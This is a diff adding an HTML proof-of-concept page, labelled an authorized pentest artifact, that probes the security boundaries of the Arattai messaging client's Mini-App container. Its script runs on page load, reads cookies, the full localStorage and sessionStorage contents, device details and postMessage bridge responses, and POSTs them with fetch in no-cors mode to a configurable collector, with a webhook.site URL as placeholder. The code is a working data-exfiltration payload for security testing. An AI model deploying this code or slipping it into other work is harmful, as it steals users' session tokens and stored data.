@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Arattai Mini-App PoC — Capability Probe</title>
+  <link rel="stylesheet" href="css/poc.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="header">
+    <h1>Mini-App Capability Probe</h1>
+    <div class="subtitle">Running inside the Arattai Mini-App container · probing security controls</div>
+    <div id="client-badge">
+      <span class="spinner" id="detect-spinner"></span>
+      <span id="client-label">Detecting client…</span>
+    </div>
+  </div>
+
+  <div class="warn-box">
+    <strong>Authorized internal pentest artifact.</strong> This page was loaded as a Mini-App by the
+    Arattai client. It is probing the security boundaries of the Mini-App container and will transmit
+    captured data to the configured collector endpoint. Do not use outside an authorized test environment.
+  </div>
+
+  <h2>Live Probe Results</h2>
+  <p>Each row is updated as probes complete. <strong>VULN</strong> = control absent/bypassable.
+     <strong>SAFE</strong> = control present. <strong>N/A</strong> = not applicable to this client.</p>
+
+  <div id="progress" style="color:var(--muted);font-size:0.85rem;margin-bottom:10px;">
+    <span class="spinner"></span> Running probes…
+  </div>
+
+  <table id="results-table">
+    <thead>
+      <tr>
+        <th style="width:32%">Probe</th>
+        <th style="width:10%">Status</th>
+        <th>Detail</th>
+      </tr>
+    </thead>
+    <tbody id="results-body">
+    </tbody>
+  </table>
+
+  <div id="exfil-notice" style="display:none;">
+    <strong>⚡ Active Exfil Beacon</strong> — The following data was captured and POSTed to the collector endpoint.
+    <div id="exfil-status">Preparing…</div>
+    <pre id="exfil-payload" style="margin-top:10px;max-height:320px;overflow:auto;"></pre>
+  </div>
+
+  <div class="footer" style="margin-top:32px;">
+    Arattai Security Audit · Authorized use only
+  </div>
+
+</div>
+
+<script src="js/collector-config.js"></script>
+<script src="js/client-detect.js"></script>
+<script src="js/probes.js"></script>
+<script>
+(function() {
+  "use strict";
+
+  // ── Client badge ──────────────────────────────────────────────────
+  var client = window.ArattaiClientDetect || { id: "browser", label: "Unknown", badge: "web" };
+  var badgeEl = document.getElementById("client-badge");
+  var spinnerEl = document.getElementById("detect-spinner");
+  var labelEl = document.getElementById("client-label");
+  spinnerEl.remove();
+  labelEl.textContent = client.label;
+  badgeEl.className = "badge badge-" + client.badge;
+
+  // ── Probe result renderer ─────────────────────────────────────────
+  var tbody = document.getElementById("results-body");
+
+  function addRow(name, status, detail) {
+    var tr = document.createElement("tr");
+    tr.className = status.toLowerCase();
+    tr.innerHTML =
+      "<td>" + escHtml(name) + "</td>" +
+      "<td class='status-cell status-" + escHtml(status) + "'>" + escHtml(status) + "</td>" +
+      "<td><pre style='margin:0;background:none;border:none;padding:0;font-size:0.82em;white-space:pre-wrap;word-break:break-all;'>" +
+        escHtml(detail) + "</pre></td>";
+    tbody.appendChild(tr);
+    return tr;
+  }
+
+  function escHtml(s) {
+    return String(s)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;");
+  }
+
+  // ── Collect summary for exfil ─────────────────────────────────────
+  var capturedResults = [];
+  var capturedEnv = null;
+
+  function buildBeacon(probeResults) {
+    var beacon = {
+      ts: new Date().toISOString(),
+      client: client,
+      origin: window.location.origin,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio },
+      cookies: document.cookie,
+      localStorage_keys: (function() {
+        try {
+          var keys = {};
+          for (var i = 0; i < localStorage.length; i++) {
+            var k = localStorage.key(i);
+            keys[k] = localStorage.getItem(k);
+          }
+          return keys;
+        } catch(e) { return "blocked: " + e.message; }
+      })(),
+      sessionStorage_keys: (function() {
+        try {
+          var keys = {};
+          for (var i = 0; i < sessionStorage.length; i++) {
+            var k = sessionStorage.key(i);
+            keys[k] = sessionStorage.getItem(k);
+          }
+          return keys;
+        } catch(e) { return "blocked: " + e.message; }
+      })(),
+      probes: probeResults.map(function(r) {
+        return { name: r.name, status: r.status, detail: r.detail };
+      }),
+      postmessage_bridge_findings: []
+    };
+    return beacon;
+  }
+
+  // ── postMessage bridge listener (captures async responses after probe) ──
+  window.addEventListener("message", function(event) {
+    var type = event.data && event.data.type;
+    if (type === "LocalStorageResponse" || type === "SessionStorageResponse" || type === "IDBResponse") {
+      // Additional bridge response captured — append to any pending beacon
+      if (window.__pendingBeacon) {
+        window.__pendingBeacon.postmessage_bridge_findings.push({
+          type: type,
+          origin: event.origin,
+          value: event.data.result || event.data.error,
+          requestId: event.data.requestId
+        });
+        document.getElementById("exfil-payload").textContent =
+          JSON.stringify(window.__pendingBeacon, null, 2);
+      }
+    }
+  });
+
+  // ── Exfil sender ─────────────────────────────────────────────────
+  function sendBeacon(beacon) {
+    window.__pendingBeacon = beacon;
+
+    var exfilNotice = document.getElementById("exfil-notice");
+    var exfilStatus = document.getElementById("exfil-status");
+    var exfilPayload = document.getElementById("exfil-payload");
+
+    exfilNotice.style.display = "block";
+    var payloadStr = JSON.stringify(beacon, null, 2);
+    exfilPayload.textContent = payloadStr;
+
+    if (!COLLECTOR_URL || COLLECTOR_URL === "https://webhook.site/1a50d175-1bed-455a-a407-7246a26d77e9") {
+      exfilStatus.textContent = "⚠ COLLECTOR_URL not set — data displayed above only (not transmitted). " +
+                                "Edit js/collector-config.js to enable active exfil.";
+      exfilStatus.style.color = "var(--warn)";
+      return;
+    }
+
+    exfilStatus.textContent = "POSTing to " + COLLECTOR_URL + " …";
+
+    fetch(COLLECTOR_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: payloadStr,
+      mode: "no-cors"   // no-cors so CORS preflight doesn't block; server receives body
+    }).then(function() {
+      exfilStatus.textContent = "✓ Beacon sent to " + COLLECTOR_URL +
+                                " at " + new Date().toISOString();
+      exfilStatus.style.color = "var(--vuln)";
+    }).catch(function(e) {
+      exfilStatus.textContent = "POST failed: " + e.message +
+                                " — data displayed above (check network / CORS)";
+      exfilStatus.style.color = "var(--warn)";
+    });
+  }
+
+  // ── Run probes ────────────────────────────────────────────────────
+  var progress = document.getElementById("progress");
+
+  // Add pending rows immediately
+  var probeNames = [
+    "JavaScript Execution",
+    "Environment Fingerprint",
+    "Cookie Access",
+    "localStorage Read",
+    "Mixed-Content Load (HTTP subresource from HTTPS page)",
+    "file:// Local-Read Attempt",
+    "Geolocation Permission",
+    "Camera/Microphone Permission",
+    "postMessage Storage Bridge (Web client — W2)",
+    "Electron DesktopModule Bridge"
+  ];
+
+  var pendingRows = {};
+  probeNames.forEach(function(name) {
+    var tr = document.createElement("tr");
+    tr.className = "na";
+    tr.innerHTML =
+      "<td>" + escHtml(name) + "</td>" +
+      "<td class='status-cell'><span class='spinner'></span></td>" +
+      "<td style='color:var(--muted);font-size:0.82em;'>Running…</td>";
+    tbody.appendChild(tr);
+    pendingRows[name] = tr;
+  });
+
+  window.ArattaiProbes.all().then(function(results) {
+    progress.innerHTML = "All probes complete.";
+
+    results.forEach(function(r) {
+      var tr = pendingRows[r.name];
+      if (tr) {
+        tr.className = r.status.toLowerCase();
+        tr.cells[1].innerHTML = "<span class='status-cell status-" + escHtml(r.status) + "'>" + escHtml(r.status) + "</span>";
+        tr.cells[2].innerHTML = "<pre style='margin:0;background:none;border:none;padding:0;font-size:0.82em;white-space:pre-wrap;word-break:break-all;'>" +
+                                escHtml(r.detail) + "</pre>";
+      }
+    });
+
+    var beacon = buildBeacon(results);
+    sendBeacon(beacon);
+
+  }).catch(function(e) {
+    progress.textContent = "Error during probes: " + e.message;
+  });
+
+})();
+</script>
+</body>
+</html>
